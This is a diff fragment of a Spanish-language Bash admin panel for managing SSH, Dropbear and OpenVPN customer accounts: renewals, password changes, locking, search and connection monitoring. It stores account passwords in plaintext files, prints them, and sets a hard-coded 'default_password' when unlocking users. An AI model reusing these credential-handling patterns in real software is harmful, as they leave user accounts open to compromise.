+    echo -e "data: $nueva_fecha_valida" >> "$dir_user/$namer"
+
+    local dias_restantes=$(( ($(date -d "$nueva_fecha_valida" +%s) - $(date -d "$(date +%Y-%m-%d)" +%s)) / 86400 - 1 ))
+    [ "$dias_restantes" -lt 0 ] && dias_restantes=0
+
+    msg -bar
+    echo -e " ✭ ${cor[6]}¡Membresía renovada exitosamente!${cor[5]} ✭ "
+    echo -e " ${cor[4]}Límite de usuarios:${cor[5]} $limite"
+    echo -e " ${cor[4]}Fecha de renovación:${cor[5]} $(date "+%d/%m/%Y")"
+    echo -e " ${cor[4]}Cliente:${cor[5]} $select_name"
+    echo -e " ${cor[4]}Válido hasta:${cor[5]} $fecha_valido_hasta"
+    echo -e " ${cor[4]}Días renovados:${cor[5]} $dias_a_agregar días"
+    echo -e " ${cor[4]}Días restantes:${cor[5]} $dias_restantes días"
+    echo -e " ${cor[2]}Gracias por renovar, ¡disfrute su estancia! ${cor[5]}🌟"
+
+    pkill -u "$namer"
+    msg -bar
+}
+
+del_dias() {
+    clear
+  echo -ne "${cor[5]} INGRESE NÚMERO DE DÍAS A RESTAR"
+  read -p " : " dias_a_restar
+  tput cuu1 && tput dl1
+
+  # Validar entrada vacía
+  if [ -z "$dias_a_restar" ]; then
+    echo -e "\033[1;31m ⚠️ ¡No se registraron días! Regresando... ⚠️"
+    return
+  fi
+
+  # Obtener la fecha de expiración actual en formato día/mes/año
+  data_user=$(chage -l "$namer" | grep -i "Co" | awk -F ":" '{print $2}' | xargs)
+
+  # Validar que se obtuvo la fecha de expiración correctamente
+  if [ -z "$data_user" ]; then
+    echo -e "\033[1;31m ⚠️ ¡No se pudo obtener la fecha de expiración! ⚠️"
+    return
+  fi
+
+  # Convertir la fecha de expiración a formato YYYY-MM-DD
+  data_user_yyyymmdd=$(date -d "$data_user" +%Y-%m-%d)
+
+  # Calcular la fecha "Válido hasta" restando un día a la nueva fecha de expiración
+  nueva_fecha_exp=$(date -d "$data_user_yyyymmdd -$dias_a_restar days" +%Y-%m-%d)
+
+  # Calcular la fecha "Válido hasta" restando un día a la nueva fecha de expiración
+  fecha_valido_hasta=$(date -d "$nueva_fecha_exp -1 day" "+%d/%m/%Y")
+
+  # Obtener el límite de usuarios y establecerlo como 'null' si no existe
+  limite=$(awk '/limite/ {print $2}' "$dir_user/$namer")
+  [ -z "$limite" ] && limite="null"
+
+  # Desbloquear usuario si está bloqueado
+  if [[ $(passwd --status $namer | cut -d ' ' -f2) = "L" ]]; then
+    usermod -U "$namer"
+    echo -e "\033[1;32m ⚠️ Usuario desbloqueado ⚠️"
+  fi
+
+  # Actualizar la fecha de expiración en el sistema y en el archivo de usuario
+  chage -E "$nueva_fecha_exp" "$namer" 2>/dev/null
+  echo -e "$(awk '/^data/ {next} 1' "$dir_user/$namer")" > "$dir_user/$namer"
+  echo -e "data: $nueva_fecha_exp" >> "$dir_user/$namer"
+
+  # Calcular los días restantes
+  dias_restantes=$(( ($(date -d "$nueva_fecha_exp" +%s) - $(date -d "$(date +%Y-%m-%d)" +%s)) / 86400 - 1 ))
+  [ "$dias_restantes" -lt 0 ] && dias_restantes=0
+ msg -bar
+  # Mostrar mensaje de confirmación con detalles
+  echo -e "\033[1;32m ✔️ ¡Membresía ajustada exitosamente! ✔️ "
+  echo -e "\033[1;33m Días restados: \033[1;31m-$dias_a_restar días"
+  echo -e "\033[1;34m Fecha de renovación: \033[1;32m$(date "+%d/%m/%Y")"
+  echo -e "\033[1;34m Cliente: \033[1;36m$select_name" 
+  echo -e "\033[1;34m Límite de usuarios: \033[1;36m$limite"
+
+  # Mostrar la fecha de expiración final con el día restado
+  echo -e "\033[1;34m Válido hasta: \033[1;32m$fecha_valido_hasta"
+  echo -e "${cor[5]} Quedan $dias_restantes días. ¡Disfrute su estancia!"
+  msg -bar
+  pkill -u "$namer"
+}
+
+
+
+
+
+
+ren_dias() {
+echo -ne "${cor[5]} NUMEROS DE DIAS "
+read -p " : " date
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+ if [ "$date" = "" ]; then
+echo -e "\033[1;31m ⚠️ NO SE REGISTRO DIAS! REGRESANDO ⚠️"
+return
+ fi
+limite=$(cat $dir_user/$namer | grep "limite" | awk '{print $2}')
+if [ -z "$limite" ]; then
+limite="null"
+fi
+clear&&clear
+datexp=$(date "+%d/%m/%Y" -d " + $date days")
+valid=$(date '+%C%y-%m-%d' -d " + $date days")
+  if [[ $(passwd --status $namer|cut -d ' ' -f2) = "L" ]]; then
+  	usermod -U $namer
+  	sleep 2
+  	msg -verd " ⚠️ UNLOCK ⚠️ "
+  fi
+chage -E $valid $namer 2> /dev/null
+[[ -e /etc/adm-lite/userDIR/$namer.exp ]] && {
+pass="$(cat < /etc/adm-lite/userDIR/$namer.exp)"
+(echo "$pass" ; echo "$pass" ) |passwd $namer > /dev/null 2>/dev/null
+rm -f /etc/adm-lite/userDIR/$namer.exp
+}
+echo -e "${cor[5]} CAMBIADO !"
+usr_var=$(cat $dir_user/$namer | grep -v "data")
+echo -e "$usr_var" > $dir_user/$namer
+echo -e "data: $valid" >> $dir_user/$namer
+msg -bar
+echo -e "${cor[5]} $select_user - $select_name"
+echo -e " ✭ Perfecto, Hemos Renovado tu Membresia!! ✭ "
+echo -e " RENOVADO EL  : $(date "+%d/%m/%Y") "
+echo -e " Host / IP    : ${cor[4]}$IP"
+echo -e " SU CLIENTE   : $nameFX " 
+echo -e " 📱 PERMITIDOS : $limite "
+echo -e " VALIDO HASTA : $datexp"
+echo -e "${cor[5]} RENUEVA EN $(($date + 1 )) DIAS, DISFRUTE SU ESTANCIA!. "
+pkill -u $namer
+msg -bar
+unset datexp
+unset valid
+unset usr_var
+return
+}
+
+echo -e "${cor[5]} ESCOJE LA OPCION A CAMBIAR DE $nameFX"
+msg -bar
+echo -e "\033[0;35m [\033[0;36m1\033[0;35m]\033[0;31m >${cor[3]} AÑADIR DIAS A \033[0;36m$nameFX"
+echo -e "\033[0;35m [\033[0;36m2\033[0;35m]\033[0;31m >${cor[3]} QUITAR DIAS A \033[0;36m$nameFX"
+echo -e "\033[0;35m [\033[0;36m3\033[0;35m]\033[0;31m >${cor[3]} REINICIAR DIAS A \033[0;36m$nameFX"
+msg -bar
+read -p " OPCION " _ropt
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+[[ $_ropt = "1" ]] && add_dias
+[[ $_ropt = "2" ]] && del_dias
+[[ $_ropt = "3" ]] && ren_dias
+return 
+}
+[[ "$_opt" = "3" ]] && {
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+echo -e "${cor[5]} NUEVA CONTRASEÑA PARA $nameFX"
+read -p " : " nova_senha
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+[[ "$nova_senha" = "" ]] && echo -e "${cor[5]}❌ CONTRASEÑA NO MODIFICADA ❌" && return
+(echo "$nova_senha" ; echo "$nova_senha" ) |passwd $namer > /dev/null 2>/dev/null
+usr_var1=$(cat $dir_user/$namer | grep -v "senha")
+echo -e "$usr_var1" > $dir_user/$namer
+echo -e "senha: $nova_senha" >> $dir_user/$namer
+[[ -e /etc/adm-lite/userDIR/$namer.exp ]] && rm -f /etc/adm-lite/userDIR/$namer.exp
+msg -bar
+echo -e "${cor[5]} $select_user - $select_name"
+echo -e " ✭ Perfecto, HEMOS CAMBIADO SU CONTRASEÑA!! ✭ "
+echo -e " RENOVADO EL  : $(date "+%d/%m/%Y") "
+echo -e " Host / IP    : ${cor[4]}$IP"
+echo -e " SU CLIENTE   : $nameFX " 
+echo -e " NUEVA CLAVE  : $nova_senha " 
+pkill -u $namer
+msg -bar
+unset nova_senha
+unset usr_var1
+return
+}
+[[ -z $_opt ]] && echo "⚠️ SIN SELECCION ⚠️"
+}
+
+block_user () {
+    for i in {1..20}; do tput cuu1 && tput dl1; done
+
+    msg -bar
+    echo -e "${cor[4]} LOCK / UNLOCK USUARIO PRIVADO "
+    msg -bar  
+    unset select_name namer nameFX
+    select_users 'LOCK / UNLOCK USUARIO PRIVADO'
+    [[ -z $select_name ]] && return
+    namer="$select_name"
+
+    file_path="/etc/adm-lite/userDIR/$namer"
+    [[ ! -d /etc/adm-lite ]] && mkdir -p /etc/adm-lite
+    touch /etc/adm-lite/bloqueados
+
+    if [[ -f "$file_path" ]]; then
+        local lmt senha
+        lmt=$(grep "limite" "$file_path" | awk '{print $2}')
+        senha=$(grep "senha" "$file_path" | awk '{print $2}')
+        if [[ "$lmt" = "HWID" || "$lmt" = "TOKEN" ]]; then
+            nameFX="${senha:-$namer}"
+        else
+            nameFX=$namer
+        fi
+    else
+        echo "$namer" >> usuarios_no_encontrados.txt
+        return  
+    fi
+
+    echo -e "${cor[5]} VERIFICANDO ESTADO DE $nameFX "
+    msg -bar
+
+    if [[ $(passwd --status $namer | cut -d ' ' -f2) = "P" ]]; then
+        echo -e "${cor[5]}Bloqueando USER "
+        pkill -u $namer &>/dev/null
+        droplim=$(dropbear_pids | grep -w "$namer" | awk '{print $2}')
+        kill -9 $droplim &>/dev/null
+        usermod -L $namer &>/dev/null
+        sleep 2
+        msg -verm2 "  ⚠️ LOCK ⚠️"
+        
+        # Registrar usuario en lista de bloqueados
+        grep -qxF "$namer" /etc/adm-lite/bloqueados || echo "$namer" >> /etc/adm-lite/bloqueados
+    else
+        if [[ -z $(passwd --status $namer | cut -d ' ' -f3) ]]; then
+            echo "$namer:default_password" | chpasswd
+            echo -e "${cor[5]} Se estableció una contraseña predeterminada para desbloquear al usuario."
+        fi
+        usermod -U $namer &>/dev/null
+        sleep 2
+        msg -verd " ⚠️ UNLOCK ⚠️ "
+        
+        # Eliminar de la lista de bloqueados
+        sed -i "/^$namer$/d" /etc/adm-lite/bloqueados
+    fi
+
+    pkill -u $namer 2>/dev/null
+    kill -9 $(ps aux | grep -vi "[a-z]$namer" | grep -vi "$namer[a-z]" | grep -v "[1-9]$namer" | grep -v "$namer[1-9]" | grep $namer | awk '{print $2}') 2>/dev/null
+
+    return
+}
+
+
+
+
+
+
+
+
+
+
+
+function buscar_usuario() {
+    # --- Limpieza de pantalla inicial ---
+    clear
+    for i in {1..21}; do
+        tput cuu1 && tput dl1
+    done
+    msg -bar
+    echo -e "\033[0;33m🔍 BUSCAR USUARIO 🔍\033[0m"
+    msg -bar
+
+    # Petición de entrada al usuario
+    echo -e -n "\033[1;33mIngrese el nombre de usuario, TOKEN o HWID completo: \033[0m"
+    echo
+    echo -e -n "\033[33m-> \033[0m"
+    read buscar
+
+    if [ -z "$buscar" ]; then
+        echo -e "\033[1;31mNo se ingresó ningún valor. Regresando al menú...\033[0m"
+        sleep 1
+        return
+    fi
+
+    echo -e "${cor[4]}Resultados de búsqueda para: $buscar"
+    msg -bar
+    found=false
+
+    # --- Optimización: Obtenemos los logs UNA SOLA VEZ ---
+    journalctl -u dropbear --no-pager --since "1 day ago" | grep "Password auth succeeded" > /tmp/dropbear_logins.log
+    ps -eo pid=,lstart=,comm= | grep 'dropbear' > /tmp/active_dropbear.log
+
+    # Bucle principal que recorre los archivos de usuario
+    for namer in $(ls "$dir_user" 2>/dev/null); do
+        user_file="$dir_user/$namer"
+        
+        if [ ! -e "$user_file" ] || ! id -u "$namer" &>/dev/null; then
+            continue
+        fi
+
+        # Leemos el campo 'tipo' primero. Si no existe, leemos 'limite'.
+        local tipo_usuario=$(grep "tipo:" "$user_file" 2>/dev/null | awk -F': ' '{print $2}')
+        if [[ -z "$tipo_usuario" ]]; then
+            tipo_usuario=$(grep "limite:" "$user_file" 2>/dev/null | awk '{print $2}')
+        fi
+        
+        local _sen=$(grep "senha:" "$user_file" 2>/dev/null | awk -F': ' '{print $2}')
+        local _limit=$(grep "limite:" "$user_file" 2>/dev/null | awk '{print $2}')
+        local valid_date=$(grep "data:" "$user_file" 2>/dev/null | awk -F': ' '{print $2}')
+        local creation_date=$(stat -c %y "$user_file" | cut -d' ' -f1)
+        
+        # Cálculo de días restantes (para todos los tipos, excepto los que no tienen fecha)
+        local dias_restantes_calc=0
+        if [[ -n "$valid_date" ]]; then
+            local valid_timestamp=$(date -d "$valid_date" +%s 2>/dev/null || echo 0)
+            dias_restantes_calc=$(( ( valid_timestamp - $(date +%s) ) / 86400 ))
+            [ "$dias_restantes_calc" -lt 0 ] && dias_restantes_calc=0
+        fi
+        local remaining_time_display="${dias_restantes_calc} días"
+        
+        # --- INICIO DE CÁLCULO DE CONEXIONES Y TIEMPO (CORREGIDO) ---
+        local uid=$(id -u "$namer" 2>/dev/null)
+        local sqd=0
+        local drop=0
+        local ovp=0
+        local timerr="00:00:00"
+        local _oldest_time_s=9999999999
+        local _data_now=$(date +%s)
+
+        # 1. Contar conexiones OpenVPN (sin cambios)
+        ovp=$(grep -cE ",$namer," /etc/openvpn/openvpn-status.log 2>/dev/null || echo 0)
+
+        # 2. Contar conexiones SSHD (usando el método 'ps' original, que funciona para sshd)
+        while read -r _pid _ppid; do
+            if [[ -z "$_pid" || -z "$_ppid" ]]; then continue; fi
+            local _pname=$(ps -p "$_ppid" -o comm= 2>/dev/null)
+
+            if [[ "$_pname" == *"sshd"* ]]; then
+                let sqd++
+                local _lstart_str=$(ps -p "$_pid" -o lstart= 2>/dev/null)
+                if [[ -n "$_lstart_str" ]]; then
+                    local _login_time_s=$(date -d "$_lstart_str" +%s 2>/dev/null)
+                    if [[ -n "$_login_time_s" && "$_login_time_s" -lt "$_oldest_time_s" ]]; then
+                        _oldest_time_s=$_login_time_s
+                    fi
+                fi
+            fi
+        done < <(ps -u "$uid" --no-headers -o pid=,ppid= 2>/dev/null | grep -v "ps -u")
+
+        # 3. Contar conexiones Dropbear (MÉTODO HÍBRIDO)
+        grep "for '$namer'" /tmp/dropbear_logins.log > /tmp/user_logins.log
+        
+        while read -r log_line; do
+            local _pid=$(echo "$log_line" | grep -o '\[[0-9]*\]' | tr -d '[]' | head -n 1)
+            if [[ -z "$_pid" ]]; then continue; fi
+            
+            local _lstart_str_full=$(grep "^ *$_pid" /tmp/active_dropbear.log | awk '{$1=$NF=""; print $0}' | xargs)
+
+            if [[ -n "$_lstart_str_full" ]]; then
+                let drop++
+                local _login_time_s=$(date -d "$_lstart_str_full" +%s 2>/dev/null)
+                if [[ -n "$_login_time_s" && "$_login_time_s" -lt "$_oldest_time_s" ]]; then
+                    _oldest_time_s=$_login_time_s
+                fi
+            fi
+        done < /tmp/user_logins.log
+
+        # 4. Calcular tiempo para OpenVPN
+        if [[ $ovp -gt 0 ]]; then
+            local _login_time_s_ovpn=$(grep -w "$namer" /etc/openvpn/openvpn-status.log | head -n 1 | awk -F',' '{print $8}' 2>/dev/null)
+            if [[ -n "$_login_time_s_ovpn" && "$_login_time_s_ovpn" -lt "$_oldest_time_s" ]]; then
+                 _oldest_time_s=$_login_time_s_ovpn
+            fi
+        fi
+
+        # 5. Calcular el string de tiempo (HH:MM:SS) de la sesión más antigua
+        if [[ "$_oldest_time_s" -lt 9999999999 ]]; then
+            local seg=$(($_data_now - $_oldest_time_s))
+            local min=$(($seg/60))
+            seg=$(($seg-$min*60))
+            local hor=$(($min/60))
+            min=$(($min-$hor*60))
+            timerr=$(printf "%02d:%02d:%02d" $hor $min $seg)
+        fi
+
+        # 6. Calcular conexiones totales
+        local conexiones=$(($sqd + $drop + $ovp))
+        # --- FIN DE CÁLCULO DE CONEXIONES Y TIEMPO ---
+
+        # Comprobar si el usuario coincide con la búsqueda
+        if [[ "$namer" == "$buscar" || "$_sen" == "$buscar" ]]; then
+            found=true
+            clear
+            msg -bar
+            echo -e "\033[0;33m🔍 Resultados para: $buscar 🔍\033[0m"
+            msg -bar
+
+            case "$tipo_usuario" in
+                "TOKEN"|"HWID")
+                    echo -e "\033[0;33m💻 Tipo: $tipo_usuario\033[0m"
+                    echo -e "\033[0;36m👤 Usuario: $_sen\033[0m"
+                    echo -e "\033[0;36m🔑 $tipo_usuario: $namer\033[0m"
+                    # --- INICIO DE LA CORRECCIÓN: Se añaden los detalles que faltaban ---
+                    echo -e "\033[0;33m💻 Límite: $(cat /bin/ejecutar/limFIX 2>/dev/null || echo "1")"
+                    echo -e "\033[1;34m📅 Creado: $creation_date\033[0m"
+                    echo -e "\033[1;36m⏳ Tiempo restante: $remaining_time_display\033[0m"
+                    echo -e "\033[1;36m📅 Fecha de Expiración: $(date -d "$valid_date - 1 day" +%Y-%m-%d)\033[0m"
+                    # --- FIN DE LA CORRECCIÓN ---
+                    echo -e "\033[1;32m🟢 Conexiones:  $conexiones\033[0m"
+                    echo -e "\033[0;36m⏱️ Tiempo conectado: $timerr\033[0m"
+                    msg -bar
+                    ;;
+                "ssh temporal")
+                    echo -e "\033[0;33m💻 Tipo: SSH TEMPORAL\033[0m"
+                    echo -e "\033[0;36m👤 Usuario: $namer\033[0m"
+                    echo -e "\033[0;36m🔑 Contraseña: $_sen\033[0m"
+                    echo -e "\033[0;33m💻 Límite: $_limit\033[0m"
+                    echo -e "\033[1;32m🟢 Conexiones:  $conexiones\033[0m"
+                    echo -e "\033[0;36m⏱️ Tiempo conectado: $timerr\033[0m"
+                    msg -bar
+                    ;;
+                *) # Default para SSH Normal
+                    echo -e "\033[0;33m💻 Tipo: SSH NORMAL\033[0m"
+                    echo -e "\033[0;36m👤 Usuario: $namer\033[0m"
+                    echo -e "\033[0;36m🔑 Contraseña: $_sen\033[0m"
+                    echo -e "\033[0;33m💻 Límite: $_limit\033[0m"
+                    echo -e "\033[1;34m🗓️ Creado: $creation_date\033[0m"
+                    echo -e "\033[1;36m⏳ Tiempo restante: $remaining_time_display\033[0m"
+                    echo -e "\033[1;36m📅 Fecha de Expiración: $(date -d "$valid_date - 1 day" +%Y-%m-%d)\033[0m"
+                    echo -e "\033[1;32m🟢 Conexiones:  $conexiones\033[0m"
+                    echo -e "\033[0;36m⏱️ Tiempo conectado: $timerr\033[0m"
+                    msg -bar
+                    ;;
+            esac
+        fi
+    done
+
+    if [ "$found" == "false" ]; then
+        echo -e "\033[1;31m❌ No se encontró ningún usuario con los criterios especificados.\033[0m"
+        msg -bar
+    fi
+
+    # --- Limpieza de archivos temporales ---
+    rm /tmp/dropbear_logins.log
+    rm /tmp/active_dropbear.log
+    rm /tmp/user_logins.log &>/dev/null
+
+    return
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function_4 () {
+    clear
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    msg -bar
+    echo -e "${cor[4]}>🌀HWID/SSH/TOKEN   🌀ID   🌀EXPIRACIÓN   🌀CONEXIONES"
+    msg -bar
+    _cont="0"
+    
+    for namer in `cat "/etc/passwd" | grep 'home' | grep 'false' | grep -v 'syslog' | cut -d: -f1`; do
+        if [ "$namer" = "" ]; then
+            break
+        fi
+
+        local user_file="$dir_user/$namer"
+
+        local _sen="???"
+        local _limit="∞"
+        local tipo_usuario="SSH"
+        local display_expiration=""
+        local user_display_name=""
+        local user_type_label=""
+        local user_details_line=""
+        local display_limit=""
+        local display_hwid=""
+
+        if [ -e "$user_file" ]; then
+            _sen=$(grep "senha" "$user_file" | awk '{print $2}')
+            _limit=$(grep "limite" "$user_file" | awk '{print $2}')
+            tipo_usuario=$(grep "limite" "$user_file" | awk '{print $2}')
+            # Preferir hwid_full si existe (soporta HWID largo)
+            display_hwid=$(grep "hwid_full:" "$user_file" 2>/dev/null | awk '{print $2}')
+            [[ -z "$display_hwid" ]] && display_hwid=$(grep "hwid_temporal:" "$user_file" 2>/dev/null | awk '{print $2}')
+            [[ -z "$display_hwid" ]] && display_hwid="$namer"
+        else
+            continue
+        fi
+        
+        data_sec=$(date +%s)
+
+        # Helper: expiración desde chage, si falla usa data: del archivo
+        calc_expiration() {
+            local _user="$1"
+            local _file="$2"
+            local data_user data_user_sec variavel_soma dias_use file_date
+
+            data_user=$(chage -l "$_user" 2>/dev/null | grep -i co | awk -F ":" '{print $2}' | xargs)
+            if [[ -z "$data_user" || "$data_user" = "never" ]]; then
+                file_date=$(grep "^data:" "$_file" 2>/dev/null | awk '{print $2}')
+                if [[ -n "$file_date" ]]; then
+                    data_user_sec=$(date +%s --date="$file_date" 2>/dev/null || echo 0)
+                    if [[ "$data_user_sec" -gt 0 ]]; then
+                        if [ "$data_sec" -gt "$data_user_sec" ]; then
+                            echo -e "\033[1;31mEXP"
+                        else
+                            variavel_soma=$((data_user_sec - data_sec))
+                            dias_use=$((variavel_soma / 86400))
+                            echo -e "\033[1;32m$dias_use DIAS"
+                        fi
+                        return
+                    fi
+                fi
+                echo -e "\033[1;37mINDEFINIDO"
+                return
+            fi
+            data_user_sec=$(date +%s --date="$data_user" 2>/dev/null || echo 0)
+            if [ "$data_sec" -gt "$data_user_sec" ]; then
+                echo -e "\033[1;31mEXP"
+            else
+                variavel_soma=$((data_user_sec - data_sec))
+                dias_use=$((variavel_soma / 86400))
+                echo -e "\033[1;32m$dias_use DIAS"
+            fi
+        }
+
+        case "$tipo_usuario" in
+            "TOKEN")
+                display_limit="1"
+                display_expiration=$(calc_expiration "$namer" "$user_file")
+                user_display_name="${_sen}"
+                user_type_label="TOKEN"
+                user_details_line="      ⤷ TOKEN - \033[1;32m$namer \033[0m"
+                ;;
+            "HWID")
+                display_limit="1"
+                display_expiration=$(calc_expiration "$namer" "$user_file")
+                user_display_name="${_sen}"
+                user_type_label="HWID"
+                user_details_line="      ⤷ HWID - \033[1;32m$display_hwid \033[0m"
+                ;;
+            "HWID_TEMPORAL")
+                display_limit="1"
+                display_expiration=$(grep "tiempo_validez_display" "$user_file" | awk -F': ' '{print $2}')
+                
+                if [[ -z "$display_expiration" ]]; then
+                    local stored_duration_seconds=$(grep "duration_seconds" "$user_file" | awk '{print $2}')
+                    local stored_creation_timestamp=$(grep "creation_timestamp" "$user_file" | awk '{print $2}')
+                    local current_timestamp_now=$(date +%s)
+
+                    if [[ -n "$stored_duration_seconds" && -n "$stored_creation_timestamp" ]]; then
+                        local actual_expiry_timestamp=$((stored_creation_timestamp + stored_duration_seconds))
+                        local seconds_left=$((actual_expiry_timestamp - current_timestamp_now))
+
+                        if [[ "$seconds_left" -le 0 ]]; then
+                            display_expiration="\033[1;31mEXP"
+                        elif [[ "$seconds_left" -lt 60 ]]; then
+                            display_expiration="\033[1;32m${seconds_left} SEG"
+                        elif [[ "$seconds_left" -lt 3600 ]]; then
+                            display_expiration="\033[1;32m$((seconds_left / 60)) MIN"
+                        elif [[ "$seconds_left" -lt 86400 ]]; then
+                            display_expiration="\033[1;32m$((seconds_left / 3600)) HORAS"
+                        else
+                            display_expiration="\033[1;32m$((seconds_left / 86400)) DIAS"
+                        fi
+                    else
+                        display_expiration=$(calc_expiration "$namer" "$user_file")
+                    fi
+                else
+                    local valid_timestamp_file=$(date -d "$(grep "^data:" "$user_file" | awk '{print $2}')" +%s 2>/dev/null || echo 0)
+                    if [[ "$valid_timestamp_file" -gt 0 ]] && [ "$data_sec" -gt "$valid_timestamp_file" ]; then
+                        display_expiration="\033[1;31mEXP"
+                    else
+                        display_expiration="\033[1;32m${display_expiration}\033[0m"
+                    fi
+                fi
+                user_display_name="${_sen}"
+                user_type_label="HWID TEMPORAL"
+                user_details_line="      ⤷ HWID TEMPORAL - \033[1;32m$display_hwid \033[0m"
+                ;;
+            *)
+                display_limit="$_limit"
+                display_expiration=$(calc_expiration "$namer" "$user_file")
+                user_display_name="$namer"
+                user_type_label="SSH"
+                user_details_line="      ⤷ SSH - ${_sen} "
+                ;;
+        esac
+
+        _cont=$(($_cont + 1))
+
+        sqd=$(ps -u "$namer" 2>/dev/null | grep sshd | wc -l)
+        [[ "$sqd" = "" ]] && sqd=0
+        [[ -e /etc/openvpn/openvpn-status.log ]] && ovp=$(grep -E ,"$namer", /etc/openvpn/openvpn-status.log | wc -l) || ovp=0
+        drop=$(pgrep -u "$namer" dropbear | wc -l)
+        conexiones=$(($sqd + $drop + $ovp))
+        
+        echo -e "\033[0;35m [\033[0;36m$_cont\033[0;35m] ${user_display_name}   ID$_cont     ${display_expiration}    limite ${display_limit} "
+        echo -e "${user_details_line}"
+        echo -e "\033[1;34m--------------------------------------------------\033[0m"
+    done
+
+    msg -bar
+    echo -e " \033[1;32m 🔰 # TIENES \033[1;33m [ \033[1;36m${_cont}\033[1;33m ]\033[1;32m CLIENTES EN TU SERVIDOR 🔰 #"
+    msg -bar
+    unset txt_
+} 2>/dev/null
+
+
+
+
+
+
+
+
+
+
+
+
+
+function_5() {
+    clear
+    
+    # ====================== CONSUMO CELULAR ======================
+    local factor=1.85          # ← Cambia aquí si quieres ajustar
+
+    get_consumo() {
+        local user="$1"
+        local total_bytes=0
+        while read -r pid; do
+            [[ -r "/proc/$pid/io" ]] || continue
+            r=$(awk '/rchar:/{print $2}' "/proc/$pid/io" 2>/dev/null || echo 0)
+            w=$(awk '/wchar:/{print $2}' "/proc/$pid/io" 2>/dev/null || echo 0)
+            total_bytes=$((total_bytes + r + w))
+        done < <(ps -u "$user" -o pid=,comm= 2>/dev/null | grep '[s]shd' | awk '{print $1}')
+
+        local estimated=$(awk -v t="$total_bytes" -v f="$factor" 'BEGIN {printf "%d", t / f}')
+
+        if (( estimated >= 1073741824 )); then
+            awk -v b=$estimated 'BEGIN {printf "%.2fG", b/1073741824}'
+        elif (( estimated >= 1048576 )); then
+            awk -v b=$estimated 'BEGIN {printf "%.1fM", b/1048576}'
+        else
+            awk -v b=$estimated 'BEGIN {printf "%dK", b/1024}'
+        fi
+    }
+    # ============================================================
+
+    # Encabezado
+    msg -bar
+    echo -e "\E[41;1;37m         MONITOR DE USUARIOS + CONSUMO                 \E[0m"
+    msg -bar
+    echo -e "\033[1;36m   USUARIO               CONEX     CONSUMO      TIEMPO  \033[0m"
+    msg -bar
+
+    _data_now=$(date +%s)
+    [[ -z $(locale | grep "LANG=" | cut -d "=" -f2) ]] && export LANG=en_US.UTF-8
+    nU=1
+    unset conex1
+
+    journalctl -u dropbear --no-pager --since "1 day ago" 2>/dev/null | grep "Password auth succeeded" > /tmp/dropbear_logins.log
+    ps -eo pid=,lstart=,comm= | grep 'dropbear' > /tmp/active_dropbear.log
+
+    for user in `cat "/etc/passwd"|grep 'home'|grep 'false'|grep -v 'syslog' | cut -d: -f1 |sort -f`; do
+       
+        uid=$(id -u "$user" 2>/dev/null)
+        [[ -n "$uid" ]] || continue
+
+        sqd=0; drop=0; timerr="00:00:00"; _oldest_time_s=9999999999
+
+        [[ -e /etc/openvpn/openvpn-status.log ]] && ovp="$(cat /etc/openvpn/openvpn-status.log | grep -E ,"$user", | wc -l)" || ovp=0
+
+        # SSHD + Dropbear + OpenVPN (tu código original intacto)
+        while read -r _pid _ppid; do
+            [[ -z "$_pid" || -z "$_ppid" ]] && continue
+            _pname=$(ps -p "$_ppid" -o comm= 2>/dev/null)
+            if [[ "$_pname" == *"sshd"* ]]; then
+                let sqd++
+                _lstart_str=$(ps -p "$_pid" -o lstart= 2>/dev/null)
+                [[ -n "$_lstart_str" ]] && _login_time_s=$(date -d "$_lstart_str" +%s 2>/dev/null)
+                [[ -n "$_login_time_s" && "$_login_time_s" -lt "$_oldest_time_s" ]] && _oldest_time_s=$_login_time_s
+            fi
+        done < <(ps -u "$uid" --no-headers -o pid=,ppid= 2>/dev/null | grep -v "ps -u")
+
+        grep "for '$user'" /tmp/dropbear_logins.log > /tmp/user_logins.log
+        while read -r log_line; do
+            _pid=$(echo "$log_line" | grep -o '\[[0-9]*\]' | tr -d '[]' | head -n 1)
+            [[ -z "$_pid" ]] && continue
+            _lstart_str_full=$(grep "^ *$_pid" /tmp/active_dropbear.log | awk '{$1=$NF=""; print $0}' | xargs)
+            if [[ -n "$_lstart_str_full" ]]; then
+                let drop++
+                _login_time_s=$(date -d "$_lstart_str_full" +%s 2>/dev/null)
+                [[ -n "$_login_time_s" && "$_login_time_s" -lt "$_oldest_time_s" ]] && _oldest_time_s=$_login_time_s
+            fi
+        done < /tmp/user_logins.log
+
+        if [[ $ovp -gt 0 ]]; then
+            _login_time_s_ovpn=$(grep -w "$user" /etc/openvpn/openvpn-status.log | head -n 1 | awk -F',' '{print $8}' 2>/dev/null)
+            [[ -n "$_login_time_s_ovpn" && "$_login_time_s_ovpn" -lt "$_oldest_time_s" ]] && _oldest_time_s=$_login_time_s_ovpn
+        fi
+
+        if [[ "$_oldest_time_s" -lt 9999999999 ]]; then
+            seg=$(($_data_now - $_oldest_time_s))
+            min=$(($seg/60)); seg=$(($seg-$min*60))
+            hor=$(($min/60)); min=$(($min-$hor*60))
+            timerr=$(printf "%02d:%02d:%02d" $hor $min $seg)
+        fi
+
+        cnx=$(($sqd + $drop))
+        conex=$(($cnx + $ovp))
+
+        # ====================== IMPRESIÓN CON SEPARADOR ======================
+        if [ "$conex" -gt "0" ]; then
+            local consumo=$(get_consumo "$user")
+
+            # Nombre limpio (con [HWID]/[TOKEN])
+            local nombre_display="$user"
+            if [[ -e $dir_user/${user} ]]; then
+                local tipo=$(cat $dir_user/${user} | grep "limite" | awk '{print $2}')
+                if [[ "$tipo" = "HWID" ]]; then
+                    nombre_display="$(cat $dir_user/${user} | grep "senha" | awk '{print $2}') \033[1;34m[HWID]\033[0m"
